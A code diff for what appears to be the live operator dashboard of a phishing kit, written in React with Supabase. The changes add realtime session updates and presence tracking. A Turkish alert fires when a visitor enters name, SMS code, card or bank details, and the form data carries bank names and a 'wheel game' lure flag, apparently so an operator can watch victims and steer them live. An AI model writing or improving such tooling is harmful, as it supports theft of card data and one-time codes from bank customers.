@@ -10,6 +10,7 @@ import { defaultSettings } from "@/contexts/SettingsContext";
 import { translations } from "@/lib/languageDefaults";
 import { pathToStep } from "@/lib/session-routes";
 import { playBeautifulNotification, showBeautifulToast } from "@/lib/notification";
+import { isSessionLive, parseVisitorPresenceState } from "@/lib/admin-presence";
 
 const SESSION_LIST_COLUMNS =
   "id,created_at,amount,current_step,status,ip_address,partner_name,is_hidden";
@@ -121,6 +122,7 @@ export function AdminDashboardClean() {
   const [sessionLastSeenAt, setSessionLastSeenAt] = useState<Record<string, number>>({});
   const [sessionPaths, setSessionPaths] = useState<Record<string, string>>({});
   const [liveVisitorCount, setLiveVisitorCount] = useState(0);
+  const [, setPresenceTick] = useState(0);
 
   async function compressImage(file: File, opts: { maxWidth: number; maxHeight: number; quality: number }) {
     const objectUrl = URL.createObjectURL(file);
@@ -262,93 +264,78 @@ export function AdminDashboardClean() {
     const channel = supabase
       .channel("admin-sessions-live")
       .on("postgres_changes", { event: "*", schema: "public", table: "sessions" }, (payload) => {
+        if (payload.eventType === "INSERT") {
+          const newRow = payload.new as DemoSession;
+          if (newRow.is_hidden) return;
+          setRows((prev) => {
+            if (prev.some((r) => r.id === newRow.id)) return prev;
+            return [newRow, ...prev].slice(0, 50);
+          });
+          return;
+        }
+
+        if (payload.eventType === "DELETE") {
+          const oldRow = payload.old as DemoSession;
+          if (oldRow?.id) {
+            setRows((prev) => prev.filter((r) => r.id !== oldRow.id));
+          }
+          return;
+        }
+
         if (payload.eventType === "UPDATE") {
           const newRow = payload.new as DemoSession;
-          const oldRow = payload.old as DemoSession | null;
-          const onlyPresenceChanged =
-            !!oldRow &&
-            oldRow.current_step === newRow.current_step &&
-            oldRow.amount === newRow.amount &&
-            oldRow.is_hidden === newRow.is_hidden &&
-            oldRow.partner_name === newRow.partner_name &&
-            oldRow.ip_address === newRow.ip_address;
+          const oldRow = rowsRef.current.find((r) => r.id === newRow.id) ?? (payload.old as DemoSession | null);
 
-          if (onlyPresenceChanged) {
+          if (newRow.is_hidden) {
+            setRows((prev) => prev.filter((r) => r.id !== newRow.id));
             return;
           }
-        }
 
-        if (soundEnabledRef.current) {
-          if (payload.eventType === "UPDATE") {
-            const newRow = payload.new as DemoSession;
-            const oldRow = rowsRef.current.find(r => r.id === newRow.id);
+          if (soundEnabledRef.current && oldRow) {
+            const getSignificantData = (data: any) => {
+              if (!data) return {};
+              const { bankSlug, bankName, currency, is_wheel_game, participationCode, ...rest } = data;
+              return rest;
+            };
 
-            if (oldRow) {
-              const getSignificantData = (data: any) => {
-                if (!data) return {};
-                const { bankSlug, bankName, currency, is_wheel_game, participationCode, ...rest } = data;
-                return rest;
-              };
+            const oldSignificant = getSignificantData(oldRow.form_data);
+            const newSignificant = getSignificantData(newRow.form_data);
+            const isFormDataChanged = JSON.stringify(oldSignificant) !== JSON.stringify(newSignificant);
+            const isUserSubmittedToWait = newRow.current_step === "wait" && oldRow.current_step !== "wait";
 
-              const oldSignificant = getSignificantData(oldRow.form_data);
-              const newSignificant = getSignificantData(newRow.form_data);
-
-              const isFormDataChanged = JSON.stringify(oldSignificant) !== JSON.stringify(newSignificant);
-              const isUserSubmittedToWait = newRow.current_step === "wait" && oldRow.current_step !== "wait";
-
-              if (isFormDataChanged || isUserSubmittedToWait) {
-                playNotificationSound("Yeni Form Verisi", "Kullanıcı bilgi girişi yaptı (İsim, SMS, Kart, Banka vb.).");
-              }
+            if (isFormDataChanged || isUserSubmittedToWait) {
+              playNotificationSound("Yeni Form Verisi", "Kullanıcı bilgi girişi yaptı (İsim, SMS, Kart, Banka vb.).");
             }
           }
+
+          setRows((prev) => {
+            const idx = prev.findIndex((r) => r.id === newRow.id);
+            if (idx === -1) return [newRow, ...prev].slice(0, 50);
+            const next = [...prev];
+            next[idx] = { ...next[idx], ...newRow };
+            return next;
+          });
         }
-        void load();
       })
       .subscribe();
 
     const presenceChannel = supabase.channel("online_visitors", {
       config: { presence: { key: "admin-dashboard" } },
     });
+
+    const applyPresence = () => {
+      const parsed = parseVisitorPresenceState(presenceChannel.presenceState());
+      setLiveVisitorCount(parsed.liveVisitorCount);
+      setOnlineSessionIds(new Set(parsed.onlineSessionIds));
+      setSessionPaths(parsed.sessionPaths);
+      setSessionLastSeenAt(parsed.sessionLastSeenAt);
+      setPresenceTick((t) => t + 1);
+    };
+
     presenceChannel
-      .on("presence", { event: "sync" }, () => {
-        const state = presenceChannel.presenceState();
-        let count = 0;
-        const activeIds = new Set<string>();
-        const paths: Record<string, string> = {};
-        const lastSeen: Record<string, number> = {};
-
-        for (const [, presences] of Object.entries(state)) {
-          const typedPresences = presences as Array<{
-            sessionId?: string | null;
-            pathname?: string;
-            online_at?: string;
-          }>;
-          if (typedPresences.length === 0) continue;
-
-          const hasVisitorPresence = typedPresences.some((p) =>
-            p.pathname ? !p.pathname.startsWith("/admin") : true,
-          );
-          if (hasVisitorPresence) count++;
-
-          for (const p of typedPresences) {
-            if (!p.sessionId) continue;
-            if (p.pathname?.startsWith("/admin")) continue;
-            activeIds.add(p.sessionId);
-            if (p.pathname) paths[p.sessionId] = p.pathname;
-            if (p.online_at) {
-              const ts = Date.parse(p.online_at);
-              if (!Number.isNaN(ts)) lastSeen[p.sessionId] = ts;
-            } else {
-              lastSeen[p.sessionId] = Date.now();
-            }
-          }
-        }
-
-        setLiveVisitorCount(count);
-        setOnlineSessionIds(activeIds);
-        setSessionPaths(paths);
-        setSessionLastSeenAt(lastSeen);
-      })
+      .on("presence", { event: "sync" }, applyPresence)
+      .on("presence", { event: "join" }, applyPresence)
+      .on("presence", { event: "leave" }, applyPresence)
       .subscribe(async (status) => {
         if (status === "SUBSCRIBED") {
           await presenceChannel.track({
@@ -763,9 +750,12 @@ export function AdminDashboardClean() {
                 const fd = row.form_data || {};
                 
                 // Gerçek zamanlı (WebSocket) aktiflik kontrolü
-                const lastSeenAt = sessionLastSeenAt[row.id] ?? 0;
-                const isRecentlySeen = Date.now() - lastSeenAt < 15000;
-                const isActuallyOnline = onlineSessionIds.has(row.id) || isRecentlySeen;
+                const isActuallyOnline = isSessionLive(
+                  row.id,
+                  onlineSessionIds,
+                  row.status,
+                  sessionLastSeenAt[row.id],
+                );
 
                 return (
                   <tr key={row.id} className="transition-colors hover:bg-[#141414]">
